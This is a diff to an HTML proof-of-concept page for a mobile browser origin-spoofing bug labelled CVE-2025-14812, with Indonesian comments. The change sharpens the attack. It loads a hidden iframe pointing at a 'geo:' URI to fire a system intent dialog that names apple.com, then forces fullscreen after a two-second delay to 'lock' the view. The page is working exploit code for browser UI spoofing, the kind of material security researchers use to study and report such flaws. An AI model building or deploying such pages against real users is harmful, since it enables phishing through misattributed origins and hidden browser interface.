@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>CVE-2025-14812 Inspired PoC with Fullscreen</title>
+    <title>CVE-2025-14812 Enhanced PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -15,6 +15,7 @@
         display: flex;
         align-items: center;
         justify-content: center;
+        overflow: hidden;
       }
       .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; }
       button {
@@ -44,7 +45,7 @@
   </head>
   <body>
     <div class="container">
-      <button id="execBtn">INITIALIZE CONTEXT SPOOF TEST</button>
+      <button id="execBtn">INITIALIZE ENHANCED SPOOF</button>
       <div class="info" id="statusInfo">Status: Ready for interaction.</div>
     </div>
 
@@ -53,33 +54,39 @@
       let statusInfo = document.getElementById("statusInfo");
 
       execButton.onclick = function () {
-        statusInfo.innerText = "Status: Entering fullscreen & deploying origin context...";
+        statusInfo.innerText = "Status: Deploying context vector & triggering intent...";
         this.style.display = "none";
 
-        // Meminta mode Fullscreen secara bersamaan saat interaksi tombol sah (user gesture)
-        let docElement = document.documentElement;
-        if (docElement.requestFullscreen) {
-          docElement.requestFullscreen().catch((err) => {
-            console.debug("Fullscreen restricted:", err.message);
-          });
-        } else if (docElement.webkitRequestFullscreen) { /* Safari / Mobile Webkit */
-          docElement.webkitRequestFullscreen();
-        }
-
         try {
-          // Membuat elemen iframe tersembunyi untuk memicu misattribution konteks asal 
-          // berdasarkan pola kerentanan penjelajahan seluler (CVE-2025-14812)[span_1](start_span)[span_1](end_span)
+          // Membangun elemen iframe pemicu skema URI secara dinamis dan bersih
           let spoofFrame = document.createElement("iframe");
           spoofFrame.style.display = "none";
-          
-          // Mengarahkan sub-frame ke skema URI non-HTTP atau domain target simulasi
           spoofFrame.src = "geo:0,0?q=apple.com";
           
+          // Menyematkan frame ke body untuk langsung mengeksekusi intent dialog sistem
           document.body.appendChild(spoofFrame);
-          statusInfo.innerText = "Status: Fullscreen active. Subframe URI-scheme dispatched.";
+          statusInfo.innerText = "Status: Intent dispatched. Locking view in 2 seconds...";
+
+          // Eksekusi penguncian Fullscreen secara presisi setelah jeda 2 detik
+          setTimeout(() => {
+            let docElement = document.documentElement;
+            
+            let requestFS = docElement.requestFullscreen || 
+                            docElement.webkitRequestFullscreen || 
+                            docElement.mozRequestFullScreen || 
+                            docElement.msRequestFullscreen;
+
+            if (requestFS) {
+              requestFS.call(docElement).catch((err) => {
+                console.debug("Fullscreen execution deferred:", err.message);
+              });
+            }
+            
+            statusInfo.innerText = "Status: Viewport locked and secured.";
+          }, 2000);
 
         } catch (err) {
-          statusInfo.innerText = "Status: Execution error: " + err.message;
+          statusInfo.innerText = "Status: Critical execution error: " + err.message;
           execButton.style.display = "block";
         }
       };
